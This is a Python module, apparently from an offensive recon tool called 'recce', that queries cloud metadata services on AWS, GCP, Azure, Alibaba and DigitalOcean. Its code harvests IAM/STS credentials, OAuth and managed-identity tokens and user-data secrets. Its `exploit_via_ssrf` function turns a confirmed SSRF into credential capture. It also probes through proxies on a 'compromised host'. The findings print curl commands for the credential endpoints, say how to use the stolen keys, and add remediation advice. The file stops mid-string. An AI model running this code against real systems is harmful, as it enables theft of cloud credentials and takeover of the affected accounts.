"""Link-local cloud metadata service (IMDS) probe.

169.254.169.254 (and provider variants) is never a scannable network target
across the wire — it lives on the cloud instance itself. This module runs
opportunistically:

  * from the recce runner (in case recce is executed inside a cloud VPC),
  * from a compromised host via a recce session (agent-side reach test),
  * as a follow-on from crawl.py's SSRF hit (`exploit_via_ssrf`) so a
    confirmed remote SSRF gets turned into real credential capture.

Provider dialects handled: AWS (v1 + v2, roles / user-data / identity doc /
meta-data leaves / SSH keys), GCP (SA token, project + instance), Azure
(managed identity token, instance metadata), Alibaba (RAM STS + user-data),
DigitalOcean (droplet v1.json).

Findings:
  * imds_reachable_from_host           (high)
  * cloud_provider_identified          (info)
  * imds_v1_enabled                    (critical)
  * imds_iam_credentials_exposed       (critical)
  * imds_user_data_secrets             (critical)
  * gcp_service_account_token_exposed  (critical)
  * azure_managed_identity_token_exposed (critical)
  * alibaba_ram_credentials_exposed    (critical)
  * imds_reachable_via_proxy           (critical)
  * imdsv2_hop_limit_too_high          (medium)
  * instance_identity_disclosed        (medium)
  * imds_ssh_public_keys_disclosed     (low)
  * web_ssrf_reaches_imds_credentials  (critical)

Airgap-safe: stdlib http.client + socket. Small bounded sweep per provider,
proxy.scaled() on every socket timeout.
"""
from __future__ import annotations

import http.client
import json
import re
import socket

from ..core import proxy
from ..core.models import Host


AWS_HOST = "169.254.169.254"
ALIBABA_HOST = "100.100.100.200"
GCP_HOST = "metadata.google.internal"
DO_HOST = "169.254.169.254"

_DEFAULT_PORT = 80
_TIMEOUT = 3.0
_UA = "recce-probe/1.0"

_AWS_TOKEN_TTL = "21600"

_SECRET_PATTERNS = [
    (re.compile(r"AKIA[0-9A-Z]{16}"), "aws_access_key_id"),
    (re.compile(r"ASIA[0-9A-Z]{16}"), "aws_temp_access_key_id"),
    (re.compile(r"(?i)aws_secret_access_key\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})"),
     "aws_secret_access_key"),
    (re.compile(r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"]([^'\"\n\r]{4,64})['\"]"),
     "password_assignment"),
    (re.compile(r"gh[pousr]_[A-Za-z0-9]{36,}"), "github_token"),
    (re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}"), "slack_token"),
    (re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |)PRIVATE KEY-----"),
     "private_key_block"),
    (re.compile(r"(?i)api[_-]?key\s*[=:]\s*['\"]([A-Za-z0-9_\-]{16,})['\"]"),
     "api_key_assignment"),
]


def _http(host: str, port: int, method: str, path: str,
          headers: dict | None = None, timeout: float = _TIMEOUT,
          proxy_host: str | None = None, proxy_port: int | None = None,
          use_connect: bool = False, body: bytes | None = None,
          ) -> tuple[int, dict, bytes] | None:
    """One HTTP request. When `proxy_host` is set, route via that HTTP proxy —
    absolute-URI form by default, CONNECT-tunnel when `use_connect=True`."""
    h_out = {"User-Agent": _UA, "Connection": "close"}
    if headers:
        h_out.update(headers)
    conn = None
    try:
        if proxy_host and not use_connect:
            conn = http.client.HTTPConnection(
                proxy_host, proxy_port or 8080, timeout=proxy.scaled(timeout))
            url = f"http://{host}:{port}{path}"
            conn.request(method, url, body=body, headers=h_out)
        elif proxy_host and use_connect:
            conn = http.client.HTTPConnection(
                proxy_host, proxy_port or 8080, timeout=proxy.scaled(timeout))
            conn.set_tunnel(host, port)
            conn.request(method, path, body=body, headers=h_out)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=proxy.scaled(timeout))
            conn.request(method, path, body=body, headers=h_out)
        resp = conn.getresponse()
        return resp.status, dict(resp.getheaders()), resp.read(200_000)
    except (OSError, http.client.HTTPException, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


def _tcp_reachable(host: str, port: int, timeout: float = 2.0) -> bool:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(proxy.scaled(timeout))
    try:
        s.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        try:
            s.close()
        except OSError:
            pass


def _dns_resolves(host: str) -> bool:
    try:
        socket.gethostbyname(host)
        return True
    except OSError:
        return False


def reachability(aws_host: str = AWS_HOST, alibaba_host: str = ALIBABA_HOST,
                 gcp_host: str = GCP_HOST, port: int = _DEFAULT_PORT,
                 timeout: float = 2.0) -> dict:
    return {
        "aws_reachable": _tcp_reachable(aws_host, port, timeout),
        "alibaba_reachable": _tcp_reachable(alibaba_host, port, timeout),
        "gcp_dns_resolves": _dns_resolves(gcp_host),
    }


def fingerprint(host: str = AWS_HOST, port: int = _DEFAULT_PORT,
                timeout: float = _TIMEOUT) -> str:
    """Send one dialect-specific probe per provider; return the first that
    answers plausibly. Order: AWS, GCP, Azure, DO. Alibaba uses its own host."""
    r = _http(host, port, "GET", "/latest/", timeout=timeout)
    if r and r[0] == 200 and b"meta-data" in r[2]:
        return "aws"
    r = _http(host, port, "GET", "/computeMetadata/v1/",
              headers={"Metadata-Flavor": "Google"}, timeout=timeout)
    if r and r[0] in (200, 300) and (b"project" in r[2] or b"instance" in r[2]):
        return "gcp"
    r = _http(host, port, "GET",
              "/metadata/instance?api-version=2021-02-01",
              headers={"Metadata": "true"}, timeout=timeout)
    if r and r[0] == 200 and b"compute" in r[2].lower():
        return "azure"
    r = _http(host, port, "GET", "/metadata/v1/id", timeout=timeout)
    if r and r[0] == 200 and r[2].strip().isdigit():
        return "digitalocean"
    return ""


def aws_mint_token(host: str = AWS_HOST, port: int = _DEFAULT_PORT,
                   timeout: float = _TIMEOUT) -> str:
    r = _http(host, port, "PUT", "/latest/api/token",
              headers={"X-aws-ec2-metadata-token-ttl-seconds": _AWS_TOKEN_TTL},
              timeout=timeout)
    if r and r[0] == 200:
        return r[2].decode("ascii", "replace").strip()
    return ""


def _aws_get(host: str, port: int, path: str, token: str,
             timeout: float) -> tuple[int, bytes] | None:
    headers = {"X-aws-ec2-metadata-token": token} if token else {}
    r = _http(host, port, "GET", path, headers=headers, timeout=timeout)
    if r is None:
        return None
    return r[0], r[2]


def aws_probe(host: str = AWS_HOST, port: int = _DEFAULT_PORT,
              timeout: float = _TIMEOUT) -> dict:
    out: dict = {"provider": "aws", "reachable": False,
                 "imdsv1_open": False, "imdsv2_token": "",
                 "roles": [], "credentials": [], "identity_doc": {},
                 "user_data": "", "user_data_secrets": [],
                 "meta_data": {}, "ssh_public_keys": []}

    v1 = _http(host, port, "GET", "/latest/meta-data/", timeout=timeout)
    if v1 is not None:
        out["reachable"] = True
        if v1[0] == 200:
            out["imdsv1_open"] = True

    token = aws_mint_token(host, port, timeout)
    out["imdsv2_token"] = token
    if token:
        out["reachable"] = True

    r = _aws_get(host, port, "/latest/meta-data/iam/security-credentials/",
                 token, timeout)
    if r and r[0] == 200:
        roles = [x for x in r[1].decode("ascii", "replace").split()
                 if x and not x.startswith("<")]
        out["roles"] = roles[:8]
        for role in out["roles"]:
            r2 = _aws_get(host, port,
                          f"/latest/meta-data/iam/security-credentials/{role}",
                          token, timeout)
            if r2 and r2[0] == 200:
                try:
                    j = json.loads(r2[1].decode("utf-8", "replace"))
                    if isinstance(j, dict) and j.get("AccessKeyId"):
                        out["credentials"].append({
                            "role": role,
                            "access_key_id": j.get("AccessKeyId", ""),
                            "secret_access_key": j.get("SecretAccessKey", ""),
                            "session_token": j.get("Token", ""),
                            "expiration": j.get("Expiration", ""),
                        })
                except (ValueError, UnicodeDecodeError):
                    pass

    r = _aws_get(host, port, "/latest/dynamic/instance-identity/document",
                 token, timeout)
    if r and r[0] == 200:
        try:
            out["identity_doc"] = json.loads(r[1].decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            pass

    r = _aws_get(host, port, "/latest/user-data", token, timeout)
    if r and r[0] == 200 and r[1]:
        text = r[1].decode("utf-8", "replace")
        out["user_data"] = text[:8000]
        out["user_data_secrets"] = _scan_secrets(text)

    for leaf in ("hostname", "public-hostname", "local-hostname",
                 "public-ipv4", "local-ipv4", "mac", "ami-id",
                 "instance-id", "instance-type", "placement/region",
                 "security-groups"):
        r = _aws_get(host, port, f"/latest/meta-data/{leaf}", token, timeout)
        if r and r[0] == 200 and r[1]:
            out["meta_data"][leaf] = r[1].decode("utf-8", "replace").strip()[:200]

    r = _aws_get(host, port, "/latest/meta-data/public-keys/", token, timeout)
    if r and r[0] == 200:
        for line in r[1].decode("ascii", "replace").splitlines():
            idx = line.split("=", 1)[0].strip()
            if not idx.isdigit():
                continue
            r2 = _aws_get(host, port,
                          f"/latest/meta-data/public-keys/{idx}/openssh-key",
                          token, timeout)
            if r2 and r2[0] == 200 and r2[1]:
                out["ssh_public_keys"].append(r2[1].decode("ascii", "replace").strip())
            if len(out["ssh_public_keys"]) >= 8:
                break
    return out


def gcp_probe(host: str = GCP_HOST, port: int = _DEFAULT_PORT,
              timeout: float = _TIMEOUT) -> dict:
    out: dict = {"provider": "gcp", "reachable": False,
                 "project_id": "", "numeric_project_id": "", "hostname": "",
                 "zone": "", "instance_attributes": {},
                 "service_account_email": "", "service_account_scopes": [],
                 "access_token": "", "id_token": ""}
    h = {"Metadata-Flavor": "Google"}
    r = _http(host, port, "GET", "/computeMetadata/v1/project/project-id",
              headers=h, timeout=timeout)
    if r and r[0] == 200:
        out["reachable"] = True
        out["project_id"] = r[2].decode("utf-8", "replace").strip()[:120]
    r = _http(host, port, "GET", "/computeMetadata/v1/project/numeric-project-id",
              headers=h, timeout=timeout)
    if r and r[0] == 200:
        out["numeric_project_id"] = r[2].decode("utf-8", "replace").strip()[:40]
    r = _http(host, port, "GET", "/computeMetadata/v1/instance/hostname",
              headers=h, timeout=timeout)
    if r and r[0] == 200:
        out["hostname"] = r[2].decode("utf-8", "replace").strip()[:200]
    r = _http(host, port, "GET", "/computeMetadata/v1/instance/zone",
              headers=h, timeout=timeout)
    if r and r[0] == 200:
        out["zone"] = r[2].decode("utf-8", "replace").strip()[:200]
    r = _http(host, port, "GET",
              "/computeMetadata/v1/instance/service-accounts/default/email",
              headers=h, timeout=timeout)
    if r and r[0] == 200:
        out["service_account_email"] = r[2].decode("utf-8", "replace").strip()[:200]
    r = _http(host, port, "GET",
              "/computeMetadata/v1/instance/service-accounts/default/scopes",
              headers=h, timeout=timeout)
    if r and r[0] == 200:
        out["service_account_scopes"] = [
            s.strip() for s in r[2].decode("utf-8", "replace").splitlines() if s.strip()
        ][:20]
    r = _http(host, port, "GET",
              "/computeMetadata/v1/instance/service-accounts/default/token",
              headers=h, timeout=timeout)
    if r and r[0] == 200:
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
            out["access_token"] = str(j.get("access_token", ""))[:2000]
        except (ValueError, UnicodeDecodeError):
            pass
    return out


def azure_probe(host: str = AWS_HOST, port: int = _DEFAULT_PORT,
                timeout: float = _TIMEOUT,
                resources=("https://management.azure.com/",
                           "https://storage.azure.com/",
                           "https://vault.azure.net/",
                           "https://graph.microsoft.com/")) -> dict:
    out: dict = {"provider": "azure", "reachable": False,
                 "subscription_id": "", "resource_group": "",
                 "vm_id": "", "vm_size": "", "location": "",
                 "computer_name": "", "tokens": {}, "instance": {}}
    h = {"Metadata": "true"}
    r = _http(host, port, "GET",
              "/metadata/instance?api-version=2021-02-01",
              headers=h, timeout=timeout)
    if r and r[0] == 200:
        out["reachable"] = True
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
            out["instance"] = j
            comp = (j.get("compute") or {})
            out["subscription_id"] = str(comp.get("subscriptionId", ""))[:80]
            out["resource_group"] = str(comp.get("resourceGroupName", ""))[:120]
            out["vm_id"] = str(comp.get("vmId", ""))[:80]
            out["vm_size"] = str(comp.get("vmSize", ""))[:80]
            out["location"] = str(comp.get("location", ""))[:60]
            out["computer_name"] = str((comp.get("osProfile") or {}).get(
                "computerName", ""))[:120]
        except (ValueError, UnicodeDecodeError):
            pass
    for res in resources:
        from urllib.parse import quote
        r = _http(host, port, "GET",
                  f"/metadata/identity/oauth2/token?api-version=2018-02-01"
                  f"&resource={quote(res, safe='')}",
                  headers=h, timeout=timeout)
        if r and r[0] == 200:
            try:
                j = json.loads(r[2].decode("utf-8", "replace"))
                tok = str(j.get("access_token", ""))
                if tok:
                    out["reachable"] = True
                    out["tokens"][res] = tok[:2000]
            except (ValueError, UnicodeDecodeError):
                pass
    return out


def alibaba_probe(host: str = ALIBABA_HOST, port: int = _DEFAULT_PORT,
                  timeout: float = _TIMEOUT) -> dict:
    out: dict = {"provider": "alibaba", "reachable": False,
                 "instance_id": "", "region_id": "", "owner_account_id": "",
                 "roles": [], "credentials": [],
                 "user_data": "", "user_data_secrets": []}
    r = _http(host, port, "GET", "/latest/meta-data/", timeout=timeout)
    if r and r[0] == 200:
        out["reachable"] = True
    for leaf, key in (("instance-id", "instance_id"),
                      ("region-id", "region_id"),
                      ("owner-account-id", "owner_account_id")):
        r = _http(host, port, "GET", f"/latest/meta-data/{leaf}", timeout=timeout)
        if r and r[0] == 200 and r[2]:
            out[key] = r[2].decode("utf-8", "replace").strip()[:200]
    r = _http(host, port, "GET", "/latest/meta-data/ram/security-credentials/",
              timeout=timeout)
    if r and r[0] == 200:
        roles = [x for x in r[2].decode("ascii", "replace").split()
                 if x and not x.startswith("<")]
        out["roles"] = roles[:8]
        for role in out["roles"]:
            r2 = _http(host, port, "GET",
                       f"/latest/meta-data/ram/security-credentials/{role}",
                       timeout=timeout)
            if r2 and r2[0] == 200:
                try:
                    j = json.loads(r2[2].decode("utf-8", "replace"))
                    if isinstance(j, dict) and j.get("AccessKeyId"):
                        out["credentials"].append({
                            "role": role,
                            "access_key_id": j.get("AccessKeyId", ""),
                            "access_key_secret": j.get("AccessKeySecret", ""),
                            "security_token": j.get("SecurityToken", ""),
                            "expiration": j.get("Expiration", ""),
                        })
                except (ValueError, UnicodeDecodeError):
                    pass
    r = _http(host, port, "GET", "/latest/user-data", timeout=timeout)
    if r and r[0] == 200 and r[2]:
        text = r[2].decode("utf-8", "replace")
        out["user_data"] = text[:8000]
        out["user_data_secrets"] = _scan_secrets(text)
    return out


def do_probe(host: str = DO_HOST, port: int = _DEFAULT_PORT,
             timeout: float = _TIMEOUT) -> dict:
    out: dict = {"provider": "digitalocean", "reachable": False,
                 "droplet_id": "", "region": "", "hostname": "",
                 "public_keys": [], "user_data": "", "user_data_secrets": []}
    r = _http(host, port, "GET", "/metadata/v1.json", timeout=timeout)
    if r and r[0] == 200:
        out["reachable"] = True
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
            out["droplet_id"] = str(j.get("droplet_id", ""))[:40]
            out["region"] = str(j.get("region", ""))[:40]
            out["hostname"] = str(j.get("hostname", ""))[:200]
            out["public_keys"] = list(j.get("public_keys") or [])[:8]
            ud = j.get("user_data") or ""
            if ud:
                out["user_data"] = str(ud)[:8000]
                out["user_data_secrets"] = _scan_secrets(str(ud))
        except (ValueError, UnicodeDecodeError):
            pass
    return out


def _scan_secrets(text: str) -> list[dict]:
    hits: list[dict] = []
    for rx, label in _SECRET_PATTERNS:
        for m in rx.finditer(text):
            snippet = m.group(0)
            hits.append({"kind": label, "match": snippet[:120]})
            if len(hits) >= 20:
                return hits
    return hits


def proxy_fronted_probe(proxy_host: str, proxy_port: int,
                        target_host: str = AWS_HOST,
                        target_port: int = _DEFAULT_PORT,
                        timeout: float = _TIMEOUT) -> dict:
    """Retry the AWS IMDS /latest/ read through an HTTP forward proxy running
    on the compromised host (Squid, envoy, nginx forward-proxy). Also try
    HTTP CONNECT. Any 200 with 'meta-data' in the body = IMDS reachable via
    the proxy (Capital One 2019 pattern)."""
    out: dict = {"proxy": f"{proxy_host}:{proxy_port}",
                 "absolute_form_ok": False, "connect_tunnel_ok": False,
                 "body_snippet": ""}
    r = _http(target_host, target_port, "GET", "/latest/meta-data/",
              proxy_host=proxy_host, proxy_port=proxy_port,
              use_connect=False, timeout=timeout)
    if r and r[0] == 200 and b"instance" in r[2]:
        out["absolute_form_ok"] = True
        out["body_snippet"] = r[2][:200].decode("utf-8", "replace")
    r = _http(target_host, target_port, "GET", "/latest/meta-data/",
              proxy_host=proxy_host, proxy_port=proxy_port,
              use_connect=True, timeout=timeout)
    if r and r[0] == 200 and b"instance" in r[2]:
        out["connect_tunnel_ok"] = True
        if not out["body_snippet"]:
            out["body_snippet"] = r[2][:200].decode("utf-8", "replace")
    return out


def exploit_via_ssrf(sender, provider: str = "aws",
                     timeout: float = _TIMEOUT) -> dict:
    """Turn a confirmed remote-app SSRF hit into real IMDS credential capture.

    `sender(path, headers, method)` performs one HTTP fetch through the SSRF
    and returns response body bytes (empty on failure). Provider chooses the
    dialect. Return shape mirrors the per-provider probe results plus a
    `via='ssrf'` flag."""
    out: dict = {"via": "ssrf", "provider": provider, "reachable": False,
                 "credentials": [], "identity_doc": {}, "user_data_secrets": []}
    if provider == "aws":
        token = ""
        body = sender("/latest/api/token",
                      {"X-aws-ec2-metadata-token-ttl-seconds": _AWS_TOKEN_TTL},
                      "PUT")
        if body:
            token = body.decode("ascii", "replace").strip()
        h = {"X-aws-ec2-metadata-token": token} if token else {}
        roles_body = sender("/latest/meta-data/iam/security-credentials/", h, "GET")
        if roles_body:
            out["reachable"] = True
            roles = [x for x in roles_body.decode("ascii", "replace").split()
                     if x and not x.startswith("<")][:4]
            for role in roles:
                cb = sender(f"/latest/meta-data/iam/security-credentials/{role}",
                            h, "GET")
                if not cb:
                    continue
                try:
                    j = json.loads(cb.decode("utf-8", "replace"))
                    if isinstance(j, dict) and j.get("AccessKeyId"):
                        out["credentials"].append({
                            "role": role,
                            "access_key_id": j.get("AccessKeyId", ""),
                            "secret_access_key": j.get("SecretAccessKey", ""),
                            "session_token": j.get("Token", ""),
                            "expiration": j.get("Expiration", ""),
                        })
                except (ValueError, UnicodeDecodeError):
                    pass
        idb = sender("/latest/dynamic/instance-identity/document", h, "GET")
        if idb:
            try:
                out["identity_doc"] = json.loads(idb.decode("utf-8", "replace"))
            except (ValueError, UnicodeDecodeError):
                pass
        udb = sender("/latest/user-data", h, "GET")
        if udb:
            out["user_data_secrets"] = _scan_secrets(udb.decode("utf-8", "replace"))
    elif provider == "gcp":
        h = {"Metadata-Flavor": "Google"}
        tb = sender("/computeMetadata/v1/instance/service-accounts/default/token",
                    h, "GET")
        if tb:
            out["reachable"] = True
            try:
                j = json.loads(tb.decode("utf-8", "replace"))
                if j.get("access_token"):
                    out["credentials"].append({
                        "kind": "gcp_oauth2",
                        "access_token": str(j["access_token"])[:2000],
                    })
            except (ValueError, UnicodeDecodeError):
                pass
    elif provider == "azure":
        h = {"Metadata": "true"}
        from urllib.parse import quote
        tb = sender(f"/metadata/identity/oauth2/token?api-version=2018-02-01"
                    f"&resource={quote('https://management.azure.com/', safe='')}",
                    h, "GET")
        if tb:
            out["reachable"] = True
            try:
                j = json.loads(tb.decode("utf-8", "replace"))
                if j.get("access_token"):
                    out["credentials"].append({
                        "kind": "azure_msi",
                        "access_token": str(j["access_token"])[:2000],
                    })
            except (ValueError, UnicodeDecodeError):
                pass
    return out


def probe(host: str = AWS_HOST, port: int = _DEFAULT_PORT,
          timeout: float = _TIMEOUT, providers=None) -> dict:
    """Run the whole IMDS sweep against a single endpoint.

    `providers` limits the dialects tried (default: all four link-local
    providers plus Alibaba on its own host). Callers who already know the
    provider (e.g. from `fingerprint()`) should pass just that one so a
    /24 sweep does not multiply four dialects across every host."""
    out: dict = {"host": host, "port": port, "reachable": False,
                 "providers": [], "aws": {}, "gcp": {}, "azure": {},
                 "alibaba": {}, "digitalocean": {}}
    which = providers or ("aws", "gcp", "azure", "digitalocean", "alibaba")
    if "aws" in which:
        r = aws_probe(host, port, timeout)
        if r.get("reachable"):
            out["providers"].append("aws")
            out["reachable"] = True
        out["aws"] = r
    if "gcp" in which:
        r = gcp_probe(GCP_HOST, port, timeout)
        if r.get("reachable"):
            out["providers"].append("gcp")
            out["reachable"] = True
        out["gcp"] = r
    if "azure" in which:
        r = azure_probe(host, port, timeout)
        if r.get("reachable"):
            out["providers"].append("azure")
            out["reachable"] = True
        out["azure"] = r
    if "digitalocean" in which:
        r = do_probe(host, port, timeout)
        if r.get("reachable"):
            out["providers"].append("digitalocean")
            out["reachable"] = True
        out["digitalocean"] = r
    if "alibaba" in which:
        r = alibaba_probe(ALIBABA_HOST, port, timeout)
        if r.get("reachable"):
            out["providers"].append("alibaba")
            out["reachable"] = True
        out["alibaba"] = r
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "curl", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind}


def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
    out: list[dict] = []
    if not probe_result:
        return out
    tgt = target_label
    if probe_result.get("via") == "ssrf":
        creds = probe_result.get("credentials") or []
        if creds:
            first = creds[0]
            akid = first.get("access_key_id") or first.get("kind") or "credential"
            out.append(_finding(
                "critical",
                "Web SSRF chained through to IMDS credential extraction",
                tgt,
                f"Confirmed SSRF against target application was replayed against "
                f"the {probe_result.get('provider','?')} link-local metadata "
                f"endpoint through the same vulnerable parameter. Extracted "
                f"{len(creds)} credential(s); first={akid}. This closes the loop "
                f"from crawler's 'metadata echoed' evidence to a real STS "
                f"credential the operator can use against the cloud plane.",
                "curl 'http://<vuln-app>/?url=http://169.254.169.254/latest/meta-data/"
                "iam/security-credentials/<role>'",
                "Allow-list outbound destinations at the vulnerable app; block "
                "link-local metadata IPs at the container/network layer; enforce "
                "IMDSv2-only on every AWS instance; set the IMDS hop-limit to 1 "
                "so a containerized workload cannot reach the metadata service.",
                ["CWE-918", "CWE-522", "CWE-732"], kind="web_ssrf_reaches_imds_credentials"))
        return out

    if not probe_result.get("reachable"):
        return out

    providers = probe_result.get("providers") or []
    if providers:
        out.append(_finding(
            "high", "Cloud IMDS reachable from this host", tgt,
            f"Link-local metadata endpoint answered for provider(s): "
            f"{', '.join(providers)}. Any SSRF/RCE on this host now puts the "
            f"instance's cloud identity + user-data in play.",
            "curl -s http://169.254.169.254/latest/meta-data/ || "
            "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/",
            "IMDS cannot be firewalled off the host itself. Enforce IMDSv2-only "
            "and hop-limit=1 (AWS), rely on the workload identity model rather "
            "than long-term keys, and treat SSRF against this host as a cloud "
            "credential compromise.",
            ["CWE-441"], kind="imds_reachable_from_host"))
        for p in providers:
            out.append(_finding(
                "info", f"Cloud provider identified: {p}", tgt,
                f"Metadata dialect answered as {p}.",
                "-", "-", [], kind="cloud_provider_identified"))

    aws = probe_result.get("aws") or {}
    if aws.get("reachable"):
        if aws.get("imdsv1_open"):
            out.append(_finding(
                "critical", "AWS IMDSv1 enabled (token-free read allowed)", tgt,
                "GET /latest/meta-data/ succeeded WITHOUT an "
                "X-aws-ec2-metadata-token header. Every SSRF against a "
                "workload on this instance is a token-free credential leak. "
                "AWS-recommended posture is IMDSv2-only.",
                "curl -s http://169.254.169.254/latest/meta-data/",
                "Set the instance metadata options to HttpTokens=required "
                "(IMDSv2-only) and HttpPutResponseHopLimit=1. Roll the fleet "
                "via `aws ec2 modify-instance-metadata-options`.",
                ["CWE-306", "CWE-668"], kind="imds_v1_enabled"))
        creds = aws.get("credentials") or []
        if creds:
            roles = ", ".join(c.get("role", "?") for c in creds)
            akids = ", ".join(c.get("access_key_id", "?")[:8] + "…" for c in creds)
            out.append(_finding(
                "critical",
                "AWS IAM role credentials exposed via IMDS", tgt,
                f"Pulled {len(creds)} short-lived STS credential set(s) from "
                f"/latest/meta-data/iam/security-credentials/. Role(s): {roles}. "
                f"AccessKeyId(s): {akids}. Use with AWS CLI as "
                f"AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY/AWS_SESSION_TOKEN.",
                "curl -s http://169.254.169.254/latest/meta-data/iam/"
                "security-credentials/<role>",
                "Scope the role to the minimum permissions the workload needs; "
                "enable IMDSv2-only; monitor STS AssumeRole/UseIdentity CloudTrail "
                "events for unusual source IPs.",
                ["CWE-522", "CWE-732"], kind="imds_iam_credentials_exposed"))
        if aws.get("user_data_secrets"):
            kinds = ", ".join(sorted({s["kind"] for s in aws["user_data_secrets"]}))
            out.append(_finding(
                "critical", "AWS user-data leaks credential-shaped secrets", tgt,
                f"/latest/user-data returned {len(aws['user_data'])} bytes "
                f"containing {len(aws['user_data_secrets'])} credential-shaped "
                f"match(es): {kinds}. Cloud-init scripts frequently bake in "
                f"long-term AWS keys, DB passwords and API tokens.",
                "curl -s http://169.254.169.254/latest/user-data",
                "Never inject secrets via user-data — use AWS Secrets Manager or "
                "SSM Parameter Store; rotate any keys already committed.",
                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets"))
        if aws.get("identity_doc"):
            d = aws["identity_doc"]
            out.append(_finding(
                "medium", "AWS instance identity document disclosed", tgt,
                f"accountId={d.get('accountId','?')} region={d.get('region','?')} "
                f"instanceId={d.get('instanceId','?')} "
                f"instanceType={d.get('instanceType','?')} "
                f"imageId={d.get('imageId','?')}. Account ID is the pivot "
                f"identifier for the whole AWS environment.",
                "curl -s http://169.254.169.254/latest/dynamic/"
                "instance-identity/document",
                "The document itself is not sensitive by design, but the "
                "accountId enables targeted phishing/enum against the tenant.",
                ["CWE-200"], kind="instance_identity_disclosed"))
        if aws.get("ssh_public_keys"):
            out.append(_finding(
                "low", "AWS instance SSH public keys disclosed via IMDS", tgt,
                f"Extracted {len(aws['ssh_public_keys'])} authorized "
                f"public-key(s) from /latest/meta-data/public-keys/. Correlate "
                f"against any authorized_keys sightings elsewhere in the "
                f"engagement — a shared key identifies the pivot user.",
                "curl -s http://169.254.169.254/latest/meta-data/public-keys/",
                "Public keys are low-severity on their own; the risk is "
                "correlation. Prefer AWS Systems Manager Session Manager or "
                "short-lived certificates over baked-in SSH keys.",
                ["CWE-200"], kind="imds_ssh_public_keys_disclosed"))

    gcp = probe_result.get("gcp") or {}
    if gcp.get("reachable"):
        if gcp.get("access_token"):
            out.append(_finding(
                "critical",
                "GCP service-account OAuth2 access token exposed via IMDS", tgt,
                f"Minted an OAuth2 access_token for service account "
                f"{gcp.get('service_account_email','default')} on project "
                f"{gcp.get('project_id','?')}. Scopes: "
                f"{', '.join(gcp.get('service_account_scopes') or [])[:200] or '(none listed)'}. "
                "Present as `Authorization: Bearer <token>` against any Google API.",
                "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal"
                "/computeMetadata/v1/instance/service-accounts/default/token",
                "Grant the smallest possible IAM roles to the compute service "
                "account; use workload identity federation rather than the default "
                "compute SA where possible; audit `serviceusage.services.use` and "
                "cross-project impersonation.",
                ["CWE-522"], kind="gcp_service_account_token_exposed"))
        if gcp.get("project_id"):
            out.append(_finding(
                "medium", "GCP project identity disclosed", tgt,
                f"project-id={gcp.get('project_id')} "
                f"numeric-project-id={gcp.get('numeric_project_id')} "
                f"zone={gcp.get('zone')} hostname={gcp.get('hostname')}. "
                f"project-id is the pivot identifier for the whole GCP "
                f"environment.",
                "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal"
                "/computeMetadata/v1/project/project-id",
                "Metadata disclosure is by design on GCE; treat project-id as "
                "public-facing and rely on IAM for actual access control.",
                ["CWE-200"], kind="instance_identity_disclosed"))

    az = probe_result.get("azure") or {}
    if az.get("reachable"):
        toks = az.get("tokens") or {}
        if toks:
            names = ", ".join(sorted(toks.keys()))
            out.append(_finding(
                "critical",
                "Azure managed identity access token(s) exposed via IMDS", tgt,
                f"Minted {len(toks)} managed-identity access token(s) for "
                f"resource(s): {names}. Subscription: "
                f"{az.get('subscription_id','?')}. Present as "
                f"`Authorization: Bearer <token>` against the corresponding "
                f"Azure Resource Manager / Storage / Key Vault / Graph API.",
                "curl -s -H 'Metadata: true' "
                "'http://169.254.169.254/metadata/identity/oauth2/token"
                "?api-version=2018-02-01&resource=https://management.azure.com/'",
                "Assign the managed identity the minimum RBAC roles the workload "
                "needs; prefer user-assigned identities scoped per workload; "
                "audit Azure AD sign-in logs for the identity for anomalous "
                "resource / IP combinations.",
                ["CWE-522"], kind="azure_managed_identity_token_exposed"))
        if az.get("subscription_id"):
            out.append(_finding(
                "medium", "Azure instance identity disclosed", tgt,
                f"subscriptionId={az.get('subscription_id')} "
                f"resourceGroup={az.get('resource_group')} "
                f"vmId={az.get('vm_id')} vmSize={az.get('vm_size')} "
                f"location={az.get('location')} "
                f"computerName={az.get('computer_name')}.",
                "curl -s -H 'Metadata: true' "
                "'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
                "Restrict who can enumerate the subscription; treat "
                "subscriptionId + resourceGroup as engagement-sensitive pivot "
                "identifiers.",
                ["CWE-200"], kind="instance_identity_disclosed"))

    ali = probe_result.get("alibaba") or {}
    if ali.get("reachable"):
        if ali.get("credentials"):
            akids = ", ".join(c.get("access_key_id", "?")[:8] + "…"
                              for c in ali["credentials"])
            out.append(_finding(
                "critical",
                "Alibaba Cloud RAM STS credentials exposed via IMDS", tgt,
                f"Pulled {len(ali['credentials'])} temporary RAM STS "
                f"credential set(s) from /latest/meta-data/ram/security-credentials/. "
                f"AccessKeyId(s): {akids}. Owner account: "
                f"{ali.get('owner_account_id','?')}. Region: "
                f"{ali.get('region_id','?')}.",
                "curl -s http://100.100.100.200/latest/meta-data/ram/"
                "security-credentials/<role>",
                "Scope the RAM role narrowly; monitor STS activity for unusual "
                "source IPs; consider IMDS access controls provided by ECS "
                "(EnableIMDSHardenedMode).",
                ["CWE-522", "CWE-732"], kind="alibaba_ram_credentials_exposed"))
        if ali.get("user_data_secrets"):
            kinds = ", ".join(sorted({s["kind"] for s in ali["user_data_secrets"]}))
            out.append(_finding(
                "critical", "Alibaba user-data leaks credential-shaped secrets", tgt,
                f"/latest/user-data returned {len(ali['user_data'])} bytes with "
